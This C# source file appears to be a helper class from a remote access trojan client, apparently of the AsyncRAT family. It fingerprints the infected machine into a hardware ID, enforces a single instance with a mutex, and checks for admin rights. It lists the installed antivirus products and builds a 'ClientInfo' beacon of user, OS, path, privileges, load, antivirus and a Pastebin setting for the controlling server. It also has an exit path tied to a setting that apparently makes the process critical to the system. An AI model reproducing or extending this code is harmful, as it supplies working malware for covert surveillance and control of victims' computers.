using Client.MessagePack;
using Client.Sockets;
using Microsoft.VisualBasic.Devices;
using System;
using System.Collections.Generic;
using System.Diagnostics;
using System.IO;
using System.Management;
using System.Net.Sockets;
using System.Security.Cryptography;
using System.Security.Principal;
using System.Text;
using System.Threading;

namespace Client.Helper
{
   static class Methods
    {
        public static PerformanceCounter TheCPUCounter { get; } = new PerformanceCounter("Processor", "% Processor Time", "_Total");
        public static PerformanceCounter TheMemCounter { get; } = new PerformanceCounter("Memory", "% Committed Bytes In Use");

        public static string HWID()
        {
            StringBuilder sb = new StringBuilder();
            sb.Append(Environment.ProcessorCount);
            sb.Append(Environment.UserName);
            sb.Append(Environment.MachineName);
            sb.Append(Environment.OSVersion);
            sb.Append(new DriveInfo(Path.GetPathRoot(Environment.SystemDirectory)).TotalSize);
            return GetHash(sb.ToString());
        }

        public static string GetHash(string strToHash)
        {
            MD5CryptoServiceProvider md5Obj = new MD5CryptoServiceProvider();
            byte[] bytesToHash = Encoding.ASCII.GetBytes(strToHash);
            bytesToHash = md5Obj.ComputeHash(bytesToHash);
            StringBuilder strResult = new StringBuilder();
            foreach (byte b in bytesToHash)
                strResult.Append(b.ToString("x2"));
            return strResult.ToString().Substring(0, 15).ToUpper();
        }

        private static Mutex _appMutex;
        public static bool CreateMutex()
        {
            bool createdNew;
            _appMutex = new Mutex(false, Settings.MTX, out createdNew);
            return createdNew;
        }
        public static void CloseMutex()
        {
            if (_appMutex != null)
            {
                _appMutex.Close();
                _appMutex = null;
            }
        }

        public static bool IsAdmin()
        {
            return new WindowsPrincipal(WindowsIdentity.GetCurrent()).IsInRole(WindowsBuiltInRole.Administrator);
        }
        public static void ClientExit()
        {
            try
            {
                if (Convert.ToBoolean(Settings.BDOS) && IsAdmin())
                    ProcessCritical.Exit();
                CloseMutex();
                ClientSocket.Client?.Shutdown(SocketShutdown.Both);
                ClientSocket.SslClient?.Close();
                ClientSocket.Client?.Close();
            }
            catch { }
        }

        public static string Antivirus()
        {
            using (ManagementObjectSearcher antiVirusSearch = new ManagementObjectSearcher(@"\\" + Environment.MachineName + @"\root\SecurityCenter2", "Select * from AntivirusProduct"))
            {
                List<string> av = new List<string>();
                foreach (ManagementBaseObject searchResult in antiVirusSearch.Get())
                {
                    av.Add(searchResult["displayName"].ToString());
                }
                if (av.Count == 0) return "None";
                return string.Join(", ", av.ToArray());
            }
        }

        public static byte[] SendInfo()
        {
            MsgPack msgpack = new MsgPack();
            msgpack.ForcePathObject("Packet").AsString = "ClientInfo";
            msgpack.ForcePathObject("HWID").AsString = HWID();
            msgpack.ForcePathObject("User").AsString = Environment.UserName.ToString();
            msgpack.ForcePathObject("OS").AsString = new ComputerInfo().OSFullName.ToString().Replace("Microsoft", null) + " " +
                Environment.Is64BitOperatingSystem.ToString().Replace("True", "64bit").Replace("False", "32bit");
            msgpack.ForcePathObject("Path").AsString = Process.GetCurrentProcess().MainModule.FileName;
            msgpack.ForcePathObject("Version").AsString = Settings.Version;
            msgpack.ForcePathObject("Admin").AsString = IsAdmin().ToString().ToLower().Replace("true", "Admin").Replace("false", "User");
            TheCPUCounter.NextValue();
            msgpack.ForcePathObject("Performance").AsString = $"CPU {(int)TheCPUCounter.NextValue()}%   RAM {(int)TheMemCounter.NextValue()}%";
            msgpack.ForcePathObject("Pastebin").AsString = Settings.Pastebin;
            msgpack.ForcePathObject("Antivirus").AsString = Antivirus();
            return msgpack.Encode2Bytes();
        }
    }
}
